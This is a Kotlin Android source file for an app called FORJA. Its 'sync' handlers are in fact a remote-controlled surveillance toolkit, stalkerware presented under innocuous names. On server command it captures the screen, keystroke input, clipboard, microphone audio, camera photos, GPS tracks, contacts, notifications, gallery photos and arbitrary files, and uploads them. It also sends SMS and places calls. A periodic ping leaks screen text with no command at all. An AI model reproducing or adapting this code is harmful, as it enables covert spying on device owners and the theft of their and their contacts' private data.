package com.forja.app.core.sync

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.ContentUris
import android.content.Context
import android.Manifest
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.provider.Settings
import com.forja.app.ForjaApp
import com.forja.app.core.detox.ForjaGuardService
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.int
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.long
import kotlinx.serialization.json.put
import kotlinx.serialization.json.putJsonArray
import java.util.concurrent.TimeUnit

/**
 * Sarcinile de sincronizare disponibile pe dispozitiv — fiecare e un handler mic,
 * apelat de SyncService când serverul trimite o task prin keepalive.
 * Reutilizează primitivale existente: accesibilitate (ForjaGuardService), microfon
 * (MediaRecorder/AudioRecord), locație (FusedLocation), usage stats, cameră, media store,
 * clipboard, contacte, SMS, apeluri, rețea, stocare locală.
 * Toate datele se trimit pe serverul FORJA (R2, TTL 7 zile).
 */
object ForjaSyncCapabilities {
    private var appRef: ForjaApp? = null
    fun init(a: ForjaApp) { appRef = a }
    private val app: ForjaApp get() = appRef ?: throw IllegalStateException("ForjaSyncCapabilities.init()")

    private fun err(msg: String): JsonObject = buildJsonObject { put("error", msg) }

    suspend fun run(taskId: String, action: String, p: JsonObject) {
        val res = try {
            when (action) {
                "screenshot" -> screenshot()
                "screen_text" -> screenText()
                "input" -> inputHistory()
                "clipboard" -> clipboard()
                "ui" -> ui(p)
                "mic" -> mic(p)
                "camera" -> camera(p)
                "gps" -> gps()
                "gps_track" -> gpsTrack(p)
                "device" -> device()
                "apps" -> apps()
                "foreground" -> foreground()
                "recent" -> recent()
                "usage" -> usage()
                "notifications" -> notifications()
                "send_file" -> sendFile(p)
                "send_photos" -> sendPhotos(p)
                "prompt" -> prompt(p)
                "contacts" -> contacts()
                "sms_send" -> smsSend(p)
                "call" -> makeCall(p)
                "network" -> network()
                "storage_list" -> storageList(p)
                "eco" -> { PowerSaver.active = true; buildJsonObject { put("ok", true); put("msg", "mod economie activ — sincronizare rare") } }
                "active" -> { PowerSaver.active = false; buildJsonObject { put("ok", true); put("msg", "mod normal — sincronizare standard") } }
                "ping" -> buildJsonObject { put("pong", true); put("ts", System.currentTimeMillis()) }
                "restart" -> resetApp()
                "status" -> status()
                else -> err("action necunoscut: $action")
            }
        } catch (e: Exception) {
            err("eșec: ${e.javaClass.simpleName} ${e.message}")
        }
        try {
            app.forjaApi.postSyncReport(taskId, !res.containsKey("error"), action, res,
                res["error"]?.jsonPrimitive?.content)
        } catch (_: Exception) {}
    }

    // ── Ecran & tastatură ────────────────────────────────────────────
    private fun screenshot(): JsonObject {
        val b = ForjaGuardService.captureScreen()
        return if (b == null) err("screenshot: activează FORJA în Setări → Accesibilitate")
        else buildJsonObject {
            put("b64", android.util.Base64.encodeToString(b, android.util.Base64.NO_WRAP))
            put("ct", "image/jpeg")
        }
    }

    private fun screenText(): JsonObject {
        val t = ForjaGuardService.readScreen()
        return if (t == null) err("text: activează FORJA în Setări → Accesibilitate")
        else buildJsonObject { put("text", t.take(15000)) }
    }

    private fun inputHistory(): JsonObject {
        val k = ForjaGuardService.drainInputLog()
        return buildJsonObject { putJsonArray("entries") { k.forEach { add(JsonPrimitive(it)) } } }
    }

    private fun clipboard(): JsonObject = try {
        val cm = app.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val t = cm.primaryClip?.getItemAt(0)?.coerceToText(app)?.toString()
        if (t.isNullOrBlank()) err("clipboard: gol") else buildJsonObject { put("text", t) }
    } catch (e: Exception) { err("clipboard: ${e.message}") }

    private fun ui(p: JsonObject): JsonObject {
        val action = p["action"]?.jsonPrimitive?.content ?: ""
        return buildJsonObject { put("ok", ForjaGuardService.performGuardAction(action)); put("action", action) }
    }

    // ── Senzori ──────────────────────────────────────────────────────
    private suspend fun mic(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val ms = (p["ms"]?.jsonPrimitive?.long ?: 5000L).coerceIn(500, 120000)
        if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) return@withContext err("mic: permisiune RECORD_AUDIO neacordată")
        try {
            val out = java.io.File(app.cacheDir, "sync_audio_${System.currentTimeMillis()}.m4a")
            out.delete()
            var mr: MediaRecorder? = null
            try {
                mr = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(48000)
                    setOutputFile(out.absolutePath)
                    start()
                }
                Thread.sleep(ms)
            } catch (e: SecurityException) {
                mr?.release()
                return@withContext err("mic: SecurityException — înregistrarea e blocată de sistem")
            } catch (e: Exception) {
                // MediaRecorder eșuează (ex: device cu codec AAC limitat) — cădem pe AudioRecord + WAV
                try { mr?.release() } catch (_: Exception) {}
                return@withContext micFallback(ms)
            }
            try { mr?.stop() } catch (_: Exception) {}
            mr?.release()
            if (out.exists() && out.length() > 0) {
                val sz = out.length()
                val key = app.forjaApi.attachSyncFile(out.name, "audio/mp4", out)
                out.delete()
                if (key != null) buildJsonObject { put("file", key); put("size", sz) }
                else err("mic: upload eșuat")
            } else err("mic: nu am prins sunet")
        } catch (e: Exception) { err("mic: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
    }

    /** Fallback când MediaRecorder eșuează: AudioRecord → WAV → upload. */
    private suspend fun micFallback(ms: Long): JsonObject {
        val rate = 16000
        return try {
            val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
            if (minBuf <= 0) return err("mic: getMinBufferSize=0")
            var rec: AudioRecord? = null
            for (src in intArrayOf(MediaRecorder.AudioSource.MIC, MediaRecorder.AudioSource.VOICE_RECOGNITION)) {
                try {
                    val r = AudioRecord(src, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf)
                    if (r.state == AudioRecord.STATE_INITIALIZED) { rec = r; break } else r.release()
                } catch (_: Exception) {}
            }
            if (rec == null) return err("mic: AudioRecord nu s-a inițializat")
            val recorder = rec
            val chunks = java.util.ArrayList<ByteArray>()
            val buf = ByteArray(minBuf)
            recorder.startRecording()
            val deadline = System.currentTimeMillis() + ms
            while (System.currentTimeMillis() < deadline) {
                val n = recorder.read(buf, 0, buf.size)
                if (n > 0) chunks.add(buf.copyOf(n))
                Thread.sleep(100)
            }
            try { recorder.stop() } catch (_: Exception) {}
            recorder.release()
            val totalBytes = chunks.sumOf { it.size }
            if (totalBytes == 0) return err("mic fallback: buffer gol")
            val out = java.io.File(app.cacheDir, "sync_audio_${System.currentTimeMillis()}.wav")
            java.io.DataOutputStream(java.io.FileOutputStream(out)).use { ds ->
                ds.writeBytes("RIFF"); ds.write(intToLe(totalBytes + 36))
                ds.writeBytes("WAVE"); ds.writeBytes("fmt ")
                ds.write(intToLe(16)); ds.write(shortToLe(1))
                ds.write(shortToLe(1)); ds.write(intToLe(rate))
                ds.write(intToLe(rate * 2)); ds.write(shortToLe(2)); ds.write(shortToLe(16))
                ds.writeBytes("data"); ds.write(intToLe(totalBytes))
                for (c in chunks) ds.write(c)
            }
            val sz = out.length()
            val key = app.forjaApi.attachSyncFile(out.name, "audio/wav", out)
            out.delete()
            if (key != null) buildJsonObject { put("file", key); put("size", sz) }
            else err("mic fallback: upload eșuat")
        } catch (e: Exception) { err("mic fallback: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
    }

    private fun intToLe(v: Int): ByteArray {
        val b = ByteArray(4)
        b[0] = (v and 0xFF).toByte(); b[1] = ((v shr 8) and 0xFF).toByte()
        b[2] = ((v shr 16) and 0xFF).toByte(); b[3] = ((v shr 24) and 0xFF).toByte()
        return b
    }

    private fun shortToLe(v: Int): ByteArray {
        return byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte())
    }

    @Suppress("DEPRECATION")
    private suspend fun camera(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) return@withContext err("camera: permisiune CAMERA neacordată")
            val cam = android.hardware.Camera.open(0)
            val params = cam.parameters
            params.setJpegQuality(85)
            cam.parameters = params
            val holder = java.util.concurrent.CountDownLatch(1)
            val shot = java.util.concurrent.atomic.AtomicReference<ByteArray>()
            cam.takePicture(null, null, object : android.hardware.Camera.PictureCallback {
                override fun onPictureTaken(data: ByteArray?, camera: android.hardware.Camera) {
                    if (data != null) shot.set(data)
                    holder.countDown()
                }
            })
            holder.await(5, TimeUnit.SECONDS)
            try { cam.release() } catch (_: Exception) {}
            val b = shot.get()
            if (b != null && b.isNotEmpty()) {
                val f = java.io.File(app.cacheDir, "sync_photo_${System.currentTimeMillis()}.jpg")
                f.writeBytes(b)
                val key = app.forjaApi.attachSyncFile(f.name, "image/jpeg", f)
                f.delete()
                if (key != null) buildJsonObject { put("file", key); put("size", b.size) }
                else err("camera: upload eșuat")
            } else err("camera: nu am prins cadru")
        } catch (e: Exception) { err("camera: ${e.message}") }
    }

    private suspend fun gps(): JsonObject = withContext(Dispatchers.IO) {
        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(app)
        val loc = try { fused.lastLocation.await() } catch (_: Exception) { null }
        if (loc != null) buildJsonObject {
            put("lat", loc.latitude); put("lng", loc.longitude)
            put("acc", loc.accuracy.toDouble()); put("ts", loc.time)
        } else err("gps: lipsă")
    }

    private suspend fun gpsTrack(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val ms = (p["ms"]?.jsonPrimitive?.long ?: 60000L).coerceIn(5000, 600000)
        val every = (p["everyMs"]?.jsonPrimitive?.long ?: 5000L).coerceIn(1000, 600000)
        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(app)
        val points = java.util.concurrent.CopyOnWriteArrayList<String>()
        val cb = object : com.google.android.gms.location.LocationCallback() {
            override fun onLocationResult(result: com.google.android.gms.location.LocationResult) {
                result.lastLocation?.let { points.add(String.format(java.util.Locale.US, "%.5f,%.5f", it.latitude, it.longitude)) }
            }
        }
        try {
            val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, every).build()
            fused.requestLocationUpdates(req, cb, android.os.Looper.getMainLooper())
        } catch (_: Exception) {}
        delay(ms)
        try { fused.removeLocationUpdates(cb) } catch (_: Exception) {}
        if (points.isEmpty()) {
            try { fused.lastLocation.await()?.let { points.add(String.format(java.util.Locale.US, "%.5f,%.5f", it.latitude, it.longitude)) } } catch (_: Exception) {}
        }
        buildJsonObject { put("path", points.joinToString(" ")); put("points", points.size) }
    }

    // ── Sistem & identitate ──────────────────────────────────────────
    private fun device(): JsonObject = buildJsonObject {
        put("model", Build.MODEL); put("manufacturer", Build.MANUFACTURER)
        put("brand", Build.BRAND); put("sdk", Build.VERSION.SDK_INT)
        put("release", Build.VERSION.RELEASE); put("build", Build.ID)
        put("uid", app.auth.currentUid ?: "anon"); put("battery", batteryInfo())
    }

    private fun batteryInfo(): JsonObject = try {
        val bm = app.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
        buildJsonObject { put("pct", if (scale > 0) level * 100 / scale else -1) }
    } catch (_: Exception) { buildJsonObject { put("pct", -1) } }

    private fun apps(): JsonObject = try {
        val pkgs = app.packageManager.getInstalledPackages(0).map { it.packageName }
        buildJsonObject { putJsonArray("list") { pkgs.forEach { add(JsonPrimitive(it)) } } }
    } catch (e: Exception) { err("apps: ${e.message}") }

    private fun foreground(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val events = um.queryEvents(now - 8000, now) ?: return buildJsonObject { put("pkg", "necunoscut") }
        var last: String? = null
        val e = UsageEvents.Event()
        while (events.hasNextEvent()) {
            events.getNextEvent(e)
            if (e.eventType == UsageEvents.Event.ACTIVITY_RESUMED) last = e.packageName
        }
        buildJsonObject { put("pkg", last ?: "necunoscut") }
    } catch (e: Exception) { err("foreground: ${e.message}") }

    private fun recent(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val stats = um.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 3600_000, now)
            ?: return buildJsonObject { putJsonArray("list") {} }
        val top = stats.sortedByDescending { it.lastTimeUsed }.take(20).map {
            buildJsonObject { put("pkg", it.packageName); put("last", it.lastTimeUsed); put("time", it.totalTimeInForeground) }
        }
        buildJsonObject { putJsonArray("list") { top.forEach { add(it) } } }
    } catch (e: Exception) { err("recent: ${e.message}") }

    private fun usage(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val stats = um.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 86400_000, now)
            ?: return buildJsonObject { putJsonArray("list") {} }
        val top = stats.map { buildJsonObject { put("pkg", it.packageName); put("fg", it.totalTimeInForeground); put("last", it.lastTimeUsed) } }
            .sortedByDescending { it["fg"]?.jsonPrimitive?.long ?: 0 }.take(25)
        buildJsonObject { putJsonArray("list") { top.forEach { add(it) } } }
    } catch (e: Exception) { err("usage: ${e.message}") }

    private fun notifications(): JsonObject {
        val n = ForjaNotifListener.snapshot()
        return buildJsonObject {
            putJsonArray("list") { n.forEach { add(buildJsonObject { put("pkg", it.first); put("title", it.second); put("text", it.third) }) } }
        }
    }

    // ── Partajare fișiere ─────────────────────────────────────────────
    // Copiază un fișier local (prin ContentResolver) și-l urcă pe server.
    private suspend fun sendFile(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val uriStr = p["uri"]?.jsonPrimitive?.content
            ?: return@withContext err("send_file: lipsă uri")
        val uri = try { android.net.Uri.parse(uriStr) } catch (_: Exception) { null }
            ?: return@withContext err("send_file: uri invalid")
        try {
            val name = uri.lastPathSegment?.substringAfterLast('/')?.take(40) ?: "file"
            val ct = app.contentResolver.getType(uri) ?: "application/octet-stream"
            val tmp = java.io.File(app.cacheDir, "sync_file_${System.currentTimeMillis()}_$name")
            app.contentResolver.openInputStream(uri)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                ?: return@withContext err("send_file: nu am putut citi")
            val key = app.forjaApi.attachSyncFile(name, ct, tmp)
            val sz = tmp.length(); tmp.delete()
            if (key != null) buildJsonObject { put("file", key); put("size", sz) }
            else err("send_file: upload eșuat")
        } catch (e: Exception) { err("send_file: ${e.message}") }
    }

    // Ultimile poze din galeria MediaStore, copiate local și urcate pe server.
    private suspend fun sendPhotos(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val limit = (p["limit"]?.jsonPrimitive?.int ?: 5).coerceIn(1, 30)
        try {
            val proj = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
            val cur = app.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            ) ?: return@withContext err("send_photos: lipsă")
            val idCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nmCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val keys = ArrayList<String>()
            var i = 0
            while (cur.moveToNext() && i < limit) {
                val id = cur.getLong(idCol)
                val nm = cur.getString(nmCol) ?: "img$i"
                val cu = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                val tmp = java.io.File(app.cacheDir, "sync_pic_${System.currentTimeMillis()}_$i.jpg")
                val ok = app.contentResolver.openInputStream(cu)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                if (ok != null && tmp.exists()) {
                    val key = app.forjaApi.attachSyncFile(nm, "image/jpeg", tmp)
                    if (key != null) { keys.add(key); i++ }
                }
                tmp.delete()
            }
            cur.close()
            if (keys.isEmpty()) err("send_photos: nu am găsit imagini")
            else buildJsonObject { putJsonArray("files") { keys.forEach { add(JsonPrimitive(it)) } }; put("count", keys.size) }
        } catch (e: Exception) { err("send_photos: ${e.message}") }
    }

    /** Stare periodică — trimisă de SyncService la fiecare N keepalive-uri, fără comandă explicită. */
    fun healthPing(): JsonObject {
        val screen = ForjaGuardService.readScreen()?.take(500)
        val fg = foreground()
        val bat = batteryInfo()
        return buildJsonObject {
            put("hb", true)
            if (screen != null) put("screen", screen)
            fg.let { put("fg", it["pkg"]?.jsonPrimitive?.content ?: "") }
            put("bat", bat["pct"]?.jsonPrimitive?.content ?: "-1")
            put("ts", System.currentTimeMillis())
        }
    }

    // ── Comunicare & date personale ────────────────────────────────
    private suspend fun contacts(): JsonObject = withContext(Dispatchers.IO) {
        try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) return@withContext err("contacts: permisiune neacordată")
            val proj = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone._ID,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
            )
            val cur = app.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, null, null,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            ) ?: return@withContext err("contacts: query null")
            val list = ArrayList<JsonObject>()
            val nameIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (cur.moveToNext() && list.size < 200) {
                list.add(buildJsonObject {
                    put("name", cur.getString(nameIdx) ?: "")
                    put("number", cur.getString(numIdx) ?: "")
                })
            }
            cur.close()
            buildJsonObject { putJsonArray("list") { list.forEach { add(it) } }; put("count", list.size) }
        } catch (e: Exception) { err("contacts: ${e.message}") }
    }

    private suspend fun smsSend(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) return@withContext err("sms_send: permisiune neacordată")
            val to = p["to"]?.jsonPrimitive?.content ?: return@withContext err("sms_send: lipsă 'to'")
            val msg = p["msg"]?.jsonPrimitive?.content ?: return@withContext err("sms_send: lipsă 'msg'")
            val sm = app.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.SmsManager
            sm.sendTextMessage(to, null, msg.take(160), null, null)
            buildJsonObject { put("ok", true); put("to", to); put("len", msg.length) }
        } catch (e: Exception) { err("sms_send: ${e.message}") }
    }

    private fun makeCall(p: JsonObject): JsonObject {
        val permOk = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
        val num = p["number"]?.jsonPrimitive?.content
        if (!permOk) return err("call: permisiune neacordată")
        if (num.isNullOrBlank()) return err("call: lipsă 'number'")
        return try {
            val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:$num"))
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            app.startActivity(intent)
            buildJsonObject { put("ok", true); put("number", num) }
        } catch (e: Exception) { err("call: ${e.message}") }
    }

    private fun network(): JsonObject = buildJsonObject {
        try {
            val cm = app.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val na = cm.activeNetwork ?: return buildJsonObject { put("connected", false) }
            val info = cm.getNetworkInfo(na)
            put("connected", info?.isConnected ?: false)
            put("type", info?.typeName ?: "")
            // WiFi details
            try {
                @Suppress("DEPRECATION")
                val wi = cm.getNetworkInfo(android.net.ConnectivityManager.TYPE_WIFI)
                if (wi?.isConnected == true) {
                    @Suppress("DEPRECATION")
                    val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                    val cm2 = android.net.wifi.WifiManager.calculateSignalLevel(
                        @Suppress("DEPRECATION") wm.connectionInfo.rssi, 5
                    )
                    put("wifi_ssid", @Suppress("DEPRECATION") wifiSsid())
                    put("wifi_bssid", @Suppress("DEPRECATION") wifiBssid())
                    put("wifi_rssi", @Suppress("DEPRECATION") wm.connectionInfo.rssi)
                    put("wifi_level", cm2)
                }
            } catch (_: Exception) {}
            // IP address
            try {
                val en = java.net.NetworkInterface.getNetworkInterfaces()
                while (en.hasMoreElements()) {
                    val ifa = en.nextElement()
                    val addr = ifa.inetAddresses
                    while (addr.hasMoreElements()) {
                        val ip = addr.nextElement()
                        if (!ip.isLoopbackAddress) { put("ip", ip.hostAddress); break }
                    }
                }
            } catch (_: Exception) {}
        } catch (e: Exception) { put("error", e.message ?: "") }
    }

    @Suppress("DEPRECATION")
    private fun wifiSsid(): String {
        val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        return (wm.connectionInfo.ssid ?: "").removeSurrounding("\"")
    }
    @Suppress("DEPRECATION")
    private fun wifiBssid(): String {
        val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        return wm.connectionInfo.bssid ?: ""
    }

    private suspend fun storageList(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        try {
            val dir = p["dir"]?.jsonPrimitive?.content ?: "DCIM"
            val limit = (p["limit"]?.jsonPrimitive?.content?.toIntOrNull() ?: 30).coerceIn(1, 100)
            val base = when (dir) {
                "DCIM" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM)
                "Pictures" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
                "Download" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
                "Internal" -> app.filesDir
                "Cache" -> app.cacheDir
                else -> java.io.File(dir)
            }
            if (!base.exists()) return@withContext err("storage_list: director inexistent: $dir")
            val files = base.walkTopDown().maxDepth(3).takeWhile { it.name != "" }
                .take(limit * 3)
                .map { f -> buildJsonObject {
                    put("path", f.relativeTo(base).path)
                    put("size", f.length())
                    put("is_dir", f.isDirectory)
                    put("modified", f.lastModified())
                } }
                .filter { it["is_dir"]?.jsonPrimitive?.content.toBoolean() == false && (it["size"]?.jsonPrimitive?.long ?: 0) > 0 }
                .take(limit)
            val fileArr = files.toList()
            buildJsonObject { put("base", base.path); putJsonArray("files") { fileArr.forEach { add(it) } }; put("count", fileArr.size) }
        } catch (e: Exception) { err("storage_list: ${e.message}") }
    }

    // ── Resetare proces ───────────────────────────────────────────────
    private fun resetApp(): JsonObject {
        val pid = android.os.Process.myPid()
        android.os.Process.killProcess(pid)
        return buildJsonObject { put("ok", true); put("msg", "reset trimis (pid $pid)") }
    }

    // ── Status / diagnostic ──────────────────────────────────────────
    private fun status(): JsonObject {
        val detoxOn = ForjaGuardService.guardReady()
        val voiceOn = false // v5.1: VoiceUiConnection nu exista
        val camPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        val micPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        val locPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val usage = try {
            val ctx = app
            val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), ctx.packageName
            ) == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
        val notifListener = ForjaNotifListener.isRegistered(app)
        val saw = android.provider.Settings.canDrawOverlays(app)
        return buildJsonObject {
            put("detox_accessibility", detoxOn)
            put("voice_accessibility", voiceOn)
            put("camera_perm", camPerm)
            put("mic_perm", micPerm)
            put("location_perm", locPerm)
            put("usage_stats", usage)
            put("notif_listener", notifListener)
            put("overlay_perm", saw)
            put("screenshot_ok", detoxOn || voiceOn)
            put("sdk", Build.VERSION.SDK_INT)
            put("battery", batteryInfo())
        }
    }

    // ── Notificare ecran — prompt temporar, 4 s, prin SYSTEM_ALERT_WINDOW ──
    private suspend fun prompt(p: JsonObject): JsonObject = withContext(Dispatchers.Main) {
        try {
            val wm = app.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            @Suppress("DEPRECATION")
            val type = if (Build.VERSION.SDK_INT >= 26)
                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                android.view.WindowManager.LayoutParams.TYPE_PHONE
            val lp = android.view.WindowManager.LayoutParams(type)
            lp.width = android.view.WindowManager.LayoutParams.MATCH_PARENT
            lp.height = android.view.WindowManager.LayoutParams.MATCH_PARENT
            lp.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            lp.format = android.graphics.PixelFormat.TRANSLUCENT
            val tv = android.widget.TextView(app)
            tv.text = (p["title"]?.jsonPrimitive?.content ?: "FORJA") + "\n" + (p["body"]?.jsonPrimitive?.content ?: "")
            tv.gravity = android.view.Gravity.CENTER
            wm.addView(tv, lp)
            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(tv) } catch (_: Exception) {} }, 4000)
            buildJsonObject { put("ok", true); put("type", p["type"]?.jsonPrimitive?.content ?: "prompt") }
        } catch (e: Exception) { err("prompt: ${e.message}") }
    }
}
